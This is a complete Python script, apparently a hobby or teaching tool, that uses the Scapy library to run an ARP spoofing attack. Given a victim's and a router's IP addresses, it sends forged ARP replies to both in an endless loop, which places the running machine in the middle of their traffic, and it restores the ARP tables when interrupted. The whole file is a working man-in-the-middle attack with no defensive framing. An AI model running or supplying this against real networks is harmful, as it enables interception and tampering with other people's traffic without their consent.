from scapy.all import *
import sys

def arp_spoof(dest_ip, dest_mac, source_ip):
    packet = ARP(op="is-at", hwsrc=get_if_hwaddr(conf.iface), psrc= source_ip, hwdst= dest_mac , pdst= dest_ip)
    send(packet, verbose=False)

def arp_restore(dest_ip, dest_mac, source_ip, source_mac):
    packet = ARP(op="is-at", hwsrc=source_mac,
                    psrc= source_ip, hwdst= dest_mac , pdst= dest_ip)
    send(packet, verbose=False)

def main():
	victim_ip= sys.argv[1]
	router_ip= sys.argv[2]
	victim_mac = getmacbyip(victim_ip)
	router_mac = getmacbyip(router_ip)
	
	try:
		print("Sending spoofed ARP packets")
		while True:
			arp_spoof(victim_ip, victim_mac, router_ip)
			arp_spoof(router_ip, router_mac, victim_ip)
	except KeyboardInterrupt:
		print("Restoring ARP Tables")
		arp_restore(router_ip, router_mac, victim_ip, victim_mac)
		arp_restore(victim_ip, victim_mac, router_ip, router_mac)
		quit()
		
main()	
